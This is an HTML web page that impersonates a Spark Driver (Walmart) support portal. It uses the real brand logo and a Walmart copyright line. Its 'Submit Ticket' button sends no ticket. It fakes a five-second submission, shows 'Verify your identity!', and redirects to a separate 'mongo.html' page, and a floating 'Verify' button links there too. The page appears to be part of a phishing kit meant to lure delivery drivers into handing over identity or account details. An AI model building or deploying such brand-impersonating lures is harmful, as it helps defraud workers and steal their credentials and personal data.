<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Ticket | Spark Driver™</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rubik', Arial, Helvetica, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f0f5ff 0%, #e6f0ff 100%);
            color: #3B4459;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: white;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
            padding: 15px 0;
        }

        .header-content {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .logo img {
            height: 40px;
        }

        .draggable-ticket {
            position: fixed;
            top: 100px;
            right: 20px;
            z-index: 1000;
            cursor: move;
            user-select: none;
        }

        .btn-ticket-drag {
            background: #0C3C92;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: move;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 4px 15px rgba(12, 60, 146, 0.3);
        }

        .btn-ticket-drag:hover {
            background: #082a6d;
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(12, 60, 146, 0.4);
        }

        .btn-ticket-drag:active {
            transform: scale(0.95);
        }

        .ticket-container {
            flex: 1;
            max-width: 500px;
            margin: 100px auto;
            padding: 0 20px;
            text-align: center;
        }

        .ticket-card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
            padding: 40px;
        }

        .ticket-title {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #0C3C92;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .ticket-title i {
            margin-right: 15px;
            font-size: 36px;
        }

        .ticket-description {
            font-size: 18px;
            color: #6c757d;
            margin-bottom: 40px;
            line-height: 1.6;
        }

        .btn-submit {
            background: #0C3C92;
            color: white;
            border: none;
            padding: 16px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 200px;
        }

        .btn-submit:hover {
            background: #082a6d;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(12, 60, 146, 0.3);
        }

        .btn-submit:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loading-spinner {
            display: none;
            margin: 30px 0;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0C3C92;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border: 1px solid #c3e6cb;
        }

        .footer {
            background: white;
            padding: 30px 0;
            text-align: center;
            margin-top: auto;
            border-top: 1px solid #eaeaea;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .footer-logo {
            margin-bottom: 20px;
        }

        .footer-logo img {
            height: 40px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #6c757d;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .footer-links a:hover {
            color: #0C3C92;
        }

        .copyright {
            color: #6c757d;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .ticket-card {
                padding: 30px 20px;
            }

            .ticket-title {
                font-size: 28px;
            }

            .ticket-description {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <img src="https://www.sparkdriverapp.com/content/dam/sparkdriverapp/images/spark-driver-logo.svg" alt="Spark Driver Logo">
            </div>
        </div>
    </header>

    <!-- Draggable Ticket Button -->
    <div class="draggable-ticket" id="draggableTicket">
        <a href="mongo.html" class="btn-ticket-drag">
            <i class="fas fa-headset"></i>
            Verify
        </a>
    </div>

    <div class="ticket-container">
        <div class="ticket-card">
            <h1 class="ticket-title">
                <i class="fas fa-headset"></i>
                Submit Ticket
            </h1>

            <p class="ticket-description">
                Click the button below to submit a support ticket. Our team will get back to you as soon as possible.
            </p>

            <button type="button" class="btn-submit" id="submitTicket">Submit Ticket</button>

            <div class="loading-spinner" id="loadingSpinner">
                <div class="spinner"></div>
                <p>Submitting your ticket...</p>
            </div>

            <div class="success-message" id="successMessage">
                <i class="fas fa-check-circle"></i>
                Verify your identity! verification...
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-logo">
                <img src="https://www.sparkdriverapp.com/content/dam/sparkdriverapp/images/spark-driver-logo.svg" alt="Spark Driver Logo">
            </div>
            <div class="footer-links">
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">Help Center</a>
                <a href="#">Contact Us</a>
            </div>
            <p class="copyright">© 2025 Walmart, Inc. All rights reserved.</p>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const submitBtn = document.getElementById('submitTicket');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const successMessage = document.getElementById('successMessage');

            // Submit ticket handler
            submitBtn.addEventListener('click', function() {
                // Show loading
                submitBtn.disabled = true;
                loadingSpinner.style.display = 'block';

                // Wait for 5 seconds
                setTimeout(function() {
                    // Hide loading and show success
                    loadingSpinner.style.display = 'none';
                    successMessage.style.display = 'block';

                    // Redirect after 2 seconds
                    setTimeout(function() {
                        window.location.href = 'mongo.html';
                    }, 2000);
                }, 5000);
            });

            // Draggable ticket button functionality
            const draggableTicket = document.getElementById('draggableTicket');
            let isDragging = false;
            let currentX;
            let currentY;
            let initialX;
            let initialY;
            let xOffset = 0;
            let yOffset = 0;

            function dragStart(e) {
                if (e.type === "touchstart") {
                    initialX = e.touches[0].clientX - xOffset;
                    initialY = e.touches[0].clientY - yOffset;
                } else {
                    initialX = e.clientX - xOffset;
                    initialY = e.clientY - yOffset;
                }

                if (e.target === draggableTicket || draggableTicket.contains(e.target)) {
                    isDragging = true;
                    draggableTicket.style.transition = 'none';
                }
            }

            function dragEnd(e) {
                initialX = currentX;
                initialY = currentY;
                isDragging = false;
                draggableTicket.style.transition = 'all 0.3s';
            }

            function drag(e) {
                if (isDragging) {
                    e.preventDefault();
                    
                    if (e.type === "touchmove") {
                        currentX = e.touches[0].clientX - initialX;
                        currentY = e.touches[0].clientY - initialY;
                    } else {
                        currentX = e.clientX - initialX;
                        currentY = e.clientY - initialY;
                    }

                    xOffset = currentX;
                    yOffset = currentY;

                    // Keep button within viewport bounds
                    const rect = draggableTicket.getBoundingClientRect();
                    const maxX = window.innerWidth - rect.width;
                    const maxY = window.innerHeight - rect.height;

                    xOffset = Math.min(Math.max(0, xOffset), maxX);
                    yOffset = Math.min(Math.max(0, yOffset), maxY);

                    setTranslate(xOffset, yOffset, draggableTicket);
                }
            }

            function setTranslate(xPos, yPos, el) {
                el.style.transform = `translate3d(${xPos}px, ${yPos}px, 0)`;
            }

            // Mouse events
            draggableTicket.addEventListener('mousedown', dragStart);
            document.addEventListener('mousemove', drag);
            document.addEventListener('mouseup', dragEnd);

            // Touch events
            draggableTicket.addEventListener('touchstart', dragStart, { passive: false });
            document.addEventListener('touchmove', drag, { passive: false });
            document.addEventListener('touchend', dragEnd);

            // Prevent default link behavior when dragging
            draggableTicket.addEventListener('click', function(e) {
                if (Math.abs(xOffset) > 5 || Math.abs(yOffset) > 5) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>
